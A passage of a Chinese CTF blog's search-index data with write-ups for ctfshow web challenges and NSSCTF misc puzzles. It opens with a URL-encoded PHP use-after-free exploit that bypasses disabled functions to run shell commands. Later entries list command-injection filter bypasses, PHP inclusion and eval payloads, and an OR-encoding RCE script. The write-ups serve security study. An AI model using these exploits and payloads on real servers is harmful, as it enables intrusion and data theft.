20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20'WIN'))%20%7B%0A%20%20%20%20%20%20%20%20die('This%20PoC%20is%20for%20*nix%20systems%20only.')%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%0A%20%20%20%20trigger_uaf('x')%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B'args'%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E\n~~~\n得到flag\n# web73\n![](/pic/73.png)\nglob遍历目录，涨知识了。\n~~~\nc=?><?php\n\t$a=new DirectoryIterator(\"glob:///*\");\nforeach($a as $f)\n{echo($f->__toString().' ');\n}\nexit(0);\n?>\n~~~\n要进行url编码\n![](/pic/73.png)\n发现了`flagc.txt`\npayload:\n~~~\nc=include(\"/flagc.txt\");exit();\n~~~\n\n# web74\n还是同样的步骤，glob遍历目录\nflag在flagx.txt里\npayload：\n~~~\nc=include(\"/flagx.txt\");exit();\n~~~","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"NSSCTF MISC刷题","url":"/2023/01/24/NSSCTF-MISC刷题/","content":"# [SWPUCTF 2021 新生赛]我的银行卡密码\n![](/pic/我的银行卡密码.png)\n压缩包有密码，而且是6位数。用ARCHPR破解，密码是`768521`。\n<!--more-->\n解压之后是一个md文件\n![](/pic/pwd.png)\n直接就懵了，看别人的wp后发现是用手机的九宫格解密的，还是写的少，涨知识了。\n解出来之后是`YLOPJOGJVOCCYNMZYPGXGPOGJDVIGATBASH`\n后面的`ATBASH`就是提示\n将`YLOPJOGJVOCCYNMZYPGXGPOGJDVIG`进行ATBASH解密，得到`BOLKQLTQELXXBMNABKTCTKLTQWERT`，后面的`QWERT`就是QWERT加密，也是个提示。\n将`BOLKQLTQELXXBMNABKTCTKLT`进行QWERT解密，得到`XISRASEACSUUXZYKXREVERSE`,后面的reverse还是个提示得到`XKYZXUUSCAESARSIX`,caesar six也是个提示凯撒密码6，得到`RESTROOM`，最后在RESERVE一下`NSSCTF{moortser}`就是flag。\n# [SWPU 2019]漂流记的马里奥\n点开exe文件出现一个1.txt\n![](/pic/maliao.png)\n提示是ntfs，可以用`NtfsStreamsEditor2`\n或者\n膜拜xenny大佬\ncmd转到文件地址，命令行notepad 1.txt:flag.txt\n最后的flag是`NSSCTF{ddg_is_cute}`\n# [SWPUCTF 2021 新生赛]gif好像有点大\n下载文件后是个GIF图，用`STEG SOLVE`打开，在第562帧的时候有一个二维码，扫码就是flag `NSSCTF{The_G1F_ls_T00_b1g}`\n# [HUBUCTF 2022 新生赛]最简单的misc\n用`stegsolve`打开，LSB隐写，得到一个二维码，然后扫码之后就是flag:`NSSCTF{aacc4238460996f0178c18d7637c9dd5}`\n\n\n\n\n唉！misc题写的恶心，就是跟作者对脑电波嘛。","tags":["刷题","MISC","NSSCTF"],"categories":["MISC","NSSCTF","刷题"]},{"title":"ctfshow web入门57~68","url":"/2023/01/22/ctfshow-web入门57/","content":"# web57\n![](/pic/57.png)\n题目显示flag在36.php中，而且给出cat和php了，只要想办法构造出36就可以了。\n`$(())`是做运算，`$((${_}))=0`,所以只要拼接除-36之后取反就行\npayload:\n~~~\n?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\n~~~\n<!--more-->\n# web58\n![](/pic/web58.png)\n题很短，但是我不会。。。\n参考文章[](https://blog.csdn.net/miuzzx/article/details/108619930)\npayload太多了\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web59\n和web58差不多。\npayload：\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web60\n和前两道题一样。\npayload:\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web 61~65\n这些题都一样。\npayload：\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web66\n![](/pic/66.png)\n这一道题`show_source`不能用了。\n![](/pic/66.1.png)\n而且flag还不在flag.php中。\n![](/pic/66.2.png)\n先用\n~~~\nvar_dump(scandir('/'));\n~~~\n查看目录结构，发现是flag.txt\npayload:\n~~~\nc=highlight_flie(\"/flag.txt\");\n~~~\n# web67\n这一题和上一题一样。\n~~~\nc=highlight_file(\"/flag.txt\");\n~~~\n# web68\n![](/pic/68.png)\n这一道题我都懵了，怎么不给源码啊。\n看别人的wp说的换成文件包含就可以。。。。\npayload:\n~~~\nc=include(\"/flag.txt\");\n~~~","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"ctfshow web入门53~56","url":"/2023/01/20/ctfshow-web入门52~56/","content":"# web53\n![](/pic/53.png)\n多过滤了一个wget，多添加了一个回显。\npayload:\n~~~\n?c=ca''t${IFS}fla''g.php\n~~~\n<!--more-->\n# web54\n![](/pic/54.png)\n这道将使用`''`的方式给剔除了。去网上找其他人的wp发现好几种方法。\n第一种：\n可以用mv。\npayload:\n~~~\n/?c=mv${IFS}fla?.php${IFS}abc.txt\n/abc.txt\n~~~\n第二种：\n~~~\ngrep test *file   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行\n~~~\npayload：\n~~~\n?c=grep${IFS}ctf${IFS}fl???php\n~~~\n第三种：\n可以用`rev`逆序输出\npayload:\n~~~\n?c=rev${IFS}fl??????\n~~~\n第四种：\n用`paste`直接查看\npayload:\n~~~\n?c=paste${IFS}fl??????\n~~~\n第五种：\n可以理解为当前目录运行cat命令实际上运行的也是bin/cat。\npayload：\n~~~\n/bin/?at${IFS}fl??????\n~~~\n# web55\n![img](/pic/55.png)\n题是真的恶心，脑子有点痒，感觉要长脑子了。。。。\n[继无字母数字的命令执行(ctfshow web入门 55)新姿势](https://blog.csdn.net/qq_46091464/article/details/108555433)\npayload:\n~~~\n?c=/???/????64 ????.???\n~~~\n# web56\n![img](/pic/56.png)\n题是越来越难了。\n参考P神的文章[上无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)\n首先构造一个POST上传文件的数据包\n~~~\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST文件上传</title>\n</head>\n<body>\n<form action=\"http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\">\n    <!--链接是当前打开的题目链接-->\n    <label for=\"file\">文件名：</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n~~~\n上传一个php文件\n~~~\n#!/bin/sh\nls\n~~~\n注：shell程序必须以\"#!/bin/sh\"开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径\n用bp抓包\n抓包之后添加参数c如下，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了ls命令\n![img](/pic/56.1)\n参数内容为什么是 .%20/???/????????[@-[] ,P神的文章已经写的很详细了。\n最后用cat看一下就可以了\n![](/pic/56.2)","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"ctfshow 刷题web45~52","url":"/2023/01/17/ctfshow-刷题web45~52/","content":"# web45\n![img](/pic/45.png)\n过滤了空格，用`%09`绕过，&&等于;，也可以用`||`和`%0a`。\npayload:\n~~~\n/?c=tac%09fl*||\n/?c=sort%09fl*||\n/?c=echo%09`tac%09fla*`||\n~~~\n<!--more-->\n# web46\n![img](/pic/46.png)\n多过滤了一些字符，但还是可以%`09`过滤空格，因为`%09`解码后就不是数字了，是一个水平制表符。\n`*`被过滤了，可以用`?`\npayload:\n~~~\n/?c=tac%09fla?.php||\n/?c=nl<fla''g.php|| nl查看源代码，<代替空格，''分割flag过滤，||解决命令黑洞\n~~~\n# web47\n![](/pic/47.png)\n无非就是sort无法用了，上一题的payload还可以用。\n# web48\n![](/pic/48.png)\n上一题的payload依然可以用。\n# web49\n![](/pic/49.png)\n依然可以用。\n# web50\n![](/pic/50.png)\n`%09`过滤了，`<>`和`?`一起使用时没有回显,所以这里的`?`可以用`\\`和`''`进行代替,。\npaylaod:\n~~~\n/?c=tac<fla\\g.php||\n/?c=nl<fla''g.php||\n~~~\n# web51\n![](/pic/51.png)\ntac被过滤了，只能用nl。\npayload:\n~~~\n?c=nl<fla\\g.php||\n~~~\n# web52\n![](/pic/52.png)\n<>也被过滤了，还可以用`$IFS`\npayload:\n~~~\n/?c=nl${IFS}fla\\g.php||\n~~~","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"ctfshow web入门41~44","url":"/2023/01/14/ctfshow41-44/","content":"# web41\n![img](/pic/web41.png)\n这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。\n我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。\n<!--more-->\n借用师傅们的脚本：https://blog.csdn.net/miuzzx/article/details/108569080\n~~~\n<?php\n$myfile = fopen(\"rce_or.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) { \n\tfor ($j=0; $j <256 ; $j++) { \n\n\t\tif($i<16){\n\t\t\t$hex_i='0'.dechex($i);\n\t\t}\n\t\telse{\n\t\t\t$hex_i=dechex($i);\n\t\t}\n\t\tif($j<16){\n\t\t\t$hex_j='0'.dechex($j);\n\t\t}\n\t\telse{\n\t\t\t$hex_j=dechex($j);\n\t\t}\n\t\t$preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i';\n\t\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n\t\t\t\t\techo \"\";\n    }\n  \n\t\telse{\n\t\t$a='%'.$hex_i;\n\t\t$b='%'.$hex_j;\n\t\t$c=(urldecode($a)|urldecode($b));\n\t\tif (ord($c)>=32&ord($c)<=126) {\n\t\t\t$contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n\t\t}\n\t}\n\n}\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n~~~\n~~~\n# -*- coding: utf-8 -*-\nimport requests\nimport urllib\nfrom sys import *\nimport os\nos.system(\"php rce_or.php\")  #没有将php写入环境变量需手动运行\nif(len(argv)!=2):\n   print(\"=\"*50)\n   print('USER：python exp.py <url>')\n   print(\"eg：  python exp.py http://ctf.show/\")\n   print(\"=\"*50)\n   exit(0)\nurl=argv[1]\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"rce_or.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))\n   data={\n       'c':urllib.parse.unquote(param)\n       }\n   r=requests.post(url,data=data)\n   print(\"\\n[*] result:\\n\"+r.text)\n~~~\n![img](/pic/web41.1.png)\n得到flag\n# web42\n![img](/pic/web42.png)\n~~~\n1：> 代表重定向到哪里，例如：echo “123” > /home/123.txt\n2：/dev/null 代表空设备文件\n3：2> 表示stderr标准错误\n4：& 表示等同于的意思，2>&1，表示2的输出重定向等同于1\n5：1 表示stdout标准输出，系统默认值是1，所以\">/dev/null\"等同于 “1>/dev/null”\n~~~\n参考：https://www.cnblogs.com/kexianting/p/11630085.html\n用双写绕过\npayload:\n~~~\n?c=cat flag.php;ls\n~~~\n# web43\n![img](/pic/web43.png)\n将;过滤掉了，可以使用其他的命令分隔符；\n常见的命令分隔符：\n~~~\n1、“;”分隔符\n用分号分隔的命令会按顺序执行，即使中间命令使用方式不对，会有相关错误输出，后面的命令照样会执行。如：\n输入：命令A；命令B；命令C\n按顺序执行A、B、C命令，若B命令调用方式不对，终端会有相关错误提示，提示后会继续执行C命令。\n2、“&&”分隔符\n同C、C++语言逻辑运算符\"&&\"类似，遇到首个命令执行失败后，后面的命令不会执行。如：\n输入：命令A && 命令B && 命令C\n先执行命令A，若A命令执行正确则再执行命令B。假如命令B执行失败，则停止，C命令不会被执行到。\n3、“||”分隔符\n同C、C++语言逻辑运算符\"||\"类似，遇到首个命令执行成功后，后面的命令不会执行。如：\n输入：命令A || 命令B || 命令C\n先执行命令A，若A命令执行失败则再执行命令B。假如命令B执行成功，则停止，C命令不会被执行到。\n~~~\npayload：\n~~~\n?c=tac flag.php||ls\n~~~\n# web44\n![img](/pic/web44.png)\nflag也过滤了，就用通配符呗。\npayload:\n~~~\n/?c=tac fl*||ls\n~~~\n常见的通配符有`*`、`?`。","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"chtshow web入门37~40","url":"/2023/01/11/chtshow37-40/","content":"# web 37\n![img](/pic/web37.png)\n考察data伪协议，data伪协议需满足allow_url_fopen，allow_url_include同时开启才能使用。\npayload：\n~~~\n/?c=data://text/plain,<?php system(\"cat fl*\");?>\n~~~\n# web38\n![img](/pic/web38.png)\nphp被过滤了，可以用短标签绕过php。\n短标签：比<?php ?>更灵活调用的方法  <? /*程序操作*/ ?>  <?=/*函数*/?>\npaylaod：\n~~~\n?c=data://text/plain,<?=`cat fla*`;?>\n/?c=data://text/plain,<?=system(\"cat fl*\");?>\n~~~\n<!--more-->\n# web39\ninclude中多了个.php，但是上一题的payload也管用，看别人的wp说是有?>结尾进行闭合，所以没有影响。\npayload:\n~~~\n/?c=data://text/plain,<?php system(\"cat fla*\")?>\n~~~\n# web40\n![img](/pic/web40.png)\n这个过滤了不少东西，但是没有过滤英文字母、下划线和英文的括号。\n可以用提示的方法\n~~~\nshow_source(next(array_reverse(scandir(pos(localeconv())))));\nshow_source()函数对文件进行语法高亮显示\nnext() 函数将内部指针指向数组中的下一个元素，并输出\narray_reverse() 函数以相反的元素顺序返回数组\nscandir() 函数返回指定目录中的文件和目录的数组\npos() 函数返回数组中的当前元素的值\nlocaleconv() 函数返回一包含本地数字及货币格式信息的数组\n~~~\n也可以换其他方法\n首先\n~~~\n/?c=print_r(get_defined_vars());\n~~~\n获得一下信息\n![img](/pic/web40.1.png)\n使用next获取这个数组的下一个位置的元素，也就是POST的元素.\n~~~\n/?c=print_r(next(get_defined_vars()));\n~~~\n![img](/pic/web40.2.png)\n然后把这个元素弹出，用array_pop\n~~~\n/?c=print_r(array_pop(next(get_defined_vars())));\n~~~\n![img](/pic/web40.3.png)\n最后再用eval执行一下就可以了\n~~~\n/?c=eval(array_pop(next(get_defined_vars())));\n~~~\nPOST数据\n~~~\n1=system(\"cat flag.php\");或1=echo`cat flag.php`;\n~~~\n关于echo、print、print_r的区别可以参考：https://blog.51cto.com/zlong37/1556855\n# 常用的注释符\n```\n#、--、-- -、//、/**/、/*letmetest*/、;%00\n```\n# MySQL中可以代替空格的字符\n```\n/**/、()、=、%20、%09、%0a、0x0a、0x0b、0x0c、0x0d、+、-、~、.等等\n```","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"ctfshow web入门29~36","url":"/2023/01/09/ctfshow29-36/","content":"# web29\n![img](/pic/web29.png)\n过滤了flag，可以用system,echo等.\n~~~\n/?c=system(\"cat fla*\");\n/?c=echo`cat fl*`;\n~~~\n# web30\n![img](/pic/web30.png)\n多过滤了一个system，还可以用echo.\n~~~\n/?echo`cat fl*`;\n~~~\n<!--more-->\n# web31\n![img](/pic/web31.png)\ncat和空格过滤了，可以用tac.\n空格可以用%09绕过.\n~~~\n/?c=echo%09`tac%09fl*`;\n~~~\n# web32\n![img](/pic/web32.png)\n过滤的东西太多了左括号都给过滤了，使用命令逃逸+文件包含.\n空格可以用%09绕过， ；可以用?>绕过,因为使用?>，所以后面没办法直接拼接php语句，需要使用文件包含.\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\n再将得到的进行base64解码得到flag\n# web33\n![img](/pic/web33.png)\n和web32差不多，用同样的payload就行\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\n# web34\n依旧可以用同样的payload\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\n# web35\n依旧可以用同样的payload\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\n连续几道题都一样，写的真恶心.\n# web36\n这道题把1换成其他的字符就行，其他步骤一样.\n~~~\n/?c=include%09$_GET[a]?>&&a=php://filter/convert.base64-encode/resource=flag.php\n~~~\n\nrequire可以代替include，PHP常用的可以不加括号的函数echo、print、isset、unset、include、require.","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]}]